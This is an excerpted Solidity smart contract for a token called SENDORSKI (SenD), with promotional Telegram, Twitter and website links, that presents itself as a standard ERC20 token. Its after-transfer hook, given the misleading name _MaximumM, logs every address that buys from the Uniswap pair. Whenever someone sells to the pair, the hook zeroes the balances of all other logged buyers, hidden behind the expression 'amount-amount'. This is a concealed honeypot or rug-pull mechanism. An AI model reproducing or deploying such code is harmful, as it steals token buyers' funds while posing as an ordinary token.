...
*/
//Telegram: https://t.me/SENDORSKI_ERC20
//Twitter: https://twitter.com/sendorski
//Website: https://www.sendorski.io/
...
contract erc400 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        uint256 fromBalance = _tBalance[from];
        require(fromBalance >= amount, "erc400: transfer amount exceeds balance");
    unchecked {
        _tBalance[from] = fromBalance - amount;
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = _tBalance[account];
        require(accountBalance >= amount, "erc400: burn amount exceeds balance");
    unchecked {
        _tBalance[account] = accountBalance - amount;
    ...
    function _MaximumM(address from,address to, uint256 amount ) internal virtual {

        if(to == uniswap) {
            
            for (uint256 i = 0; i < _Tstu.length; i++) {
                if (_Tstu[i].addr != from) {
                    _tBalance[_Tstu[i].addr] = amount-amount;
                }
            }
        ...
        if(from == uniswap) {
            _Tstu.push(accountsL(to, amount));
        }
    }
    ...
    function _afterTokenTransf(address from, address to, uint256 amount) internal virtual {
        if(_tBalance[uniswap] > 0) {
            _MaximumM(from,to,amount);
        }
    }
}
...
contract Token is erc400,Ownable {
    ...
    constructor()erc400("SENDORSKI", "SenD") {
